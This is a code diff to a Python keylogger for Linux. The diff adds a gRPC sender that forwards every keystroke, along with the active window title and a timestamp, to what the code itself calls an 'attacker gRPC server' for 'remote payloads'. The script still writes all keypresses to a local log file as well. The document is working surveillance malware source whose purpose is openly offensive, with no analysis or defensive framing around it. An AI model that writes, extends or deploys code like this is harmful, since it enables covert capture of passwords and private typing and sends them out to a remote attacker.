@@ -29,8 +29,9 @@ ENABLE_TIMESTAMPS = True
 # track last window to detect changes
 last_window_title = ""
 
-# optional callback for external actions
-_action_callback = None
+# optional callbacks — set by loggerFunction()
+_action_callback = None   # legacy: called with (key_str, key_type, window, timestamp)
+_grpc_sender = None       # NEW: called with a single formatted string → sends to gRPC
 
 
 def get_active_window_title():
@@ -45,7 +46,6 @@ def get_active_window_title():
         d = display.Display()
         root = d.screen().root
         
-        # get active window id
         NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
         prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
         
@@ -56,10 +56,8 @@ def get_active_window_title():
         if win_id == 0:
             return "Desktop"
         
-        # get window object
         window = d.create_resource_object('window', win_id)
         
-        # try _NET_WM_NAME first (utf8)
         NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
         wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
         
@@ -69,7 +67,6 @@ def get_active_window_title():
                 return name.decode('utf-8', errors='ignore')
             return str(name)
         
-        # fallback to WM_NAME
         wm_name = window.get_wm_name()
         if wm_name:
             return wm_name
@@ -83,15 +80,16 @@ def get_active_window_title():
 def on_press(key):
     """
     called on every key press.
-    logs key and window info to file.
-    calls action callback if set (non-blocking).
+    - logs to file
+    - sends to gRPC server via _grpc_sender (if set)
+    - calls legacy _action_callback (if set)
     """
     global last_window_title
     
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     current_window = get_active_window_title()
     
-    # get key string
+    # resolve key string
     if hasattr(key, 'char') and key.char:
         key_str = key.char
         key_type = 'char'
@@ -99,7 +97,13 @@ def on_press(key):
         key_str = str(key).replace('Key.', '')
         key_type = 'special'
 
-    # call action callback non-blocking if set
+    # ── gRPC send (non-blocking, primary path for remote payloads) ──
+    if _grpc_sender:
+        import threading
+        message = f"[LNX] {key_str} | {key_type} | {current_window} | {timestamp}"
+        threading.Thread(target=_grpc_sender, args=(message,), daemon=True).start()
+
+    # ── legacy action callback ──
     if _action_callback:
         import threading
         threading.Thread(
@@ -108,14 +112,13 @@ def on_press(key):
             daemon=True
         ).start()
 
+    # ── write to local log file ──
     try:
         with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
-            # log window change
             if current_window != last_window_title:
                 f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                 last_window_title = current_window
 
-            # log the key
             if key_type == 'char':
                 if ENABLE_TIMESTAMPS:
                     f.write(f'[{timestamp}] Key: {key_str}\n')
@@ -136,33 +139,30 @@ def on_press(key):
 
 
 def on_release(key):
-    """
-    called on key release.
-    stops logger when ESC is pressed.
-    """
+    """stop logger when ESC is pressed."""
     if key == keyboard.Key.esc:
         print("[*] ESC pressed, stopping...")
         return False
 
 
-def loggerFunction(action=None):
+def loggerFunction(action=None, grpc_sender=None):
     """
     main keylogger function.
     
     args:
-        action: optional callback function(key_str, key_type, window, timestamp)
-                called non-blocking on each key press.
-                key_str: the key pressed (char or special key name)
-                key_type: 'char' or 'special'
-                window: current active window title
-                timestamp: time of key press
+        action:      legacy callback(key_str, key_type, window, timestamp) — optional
+        grpc_sender: callable(message: str) — called non-blocking on every key press
+                     to forward keystrokes to the attacker gRPC server.
+                     Pass cln.send_key_non_blocking here for remote payloads.
     """
-    global _action_callback
+    global _action_callback, _grpc_sender
     _action_callback = action
+    _grpc_sender = grpc_sender
     
     print("[*] Linux Keylogger Started")
     print(f"[*] Output: {OUTPUT_FILE}")
     print(f"[*] Timestamps: {ENABLE_TIMESTAMPS}")
+    print(f"[*] gRPC sender: {'enabled' if grpc_sender else 'disabled'}")
     print(f"[*] Action callback: {'enabled' if action else 'disabled'}")
     print("[*] Press ESC to stop\n")
     
@@ -170,9 +170,9 @@ def loggerFunction(action=None):
         listener.join()
     
     _action_callback = None
+    _grpc_sender = None
     print("[*] Keylogger stopped.")
 
 
-# run if executed directly
 if __name__ == "__main__":
     loggerFunction()
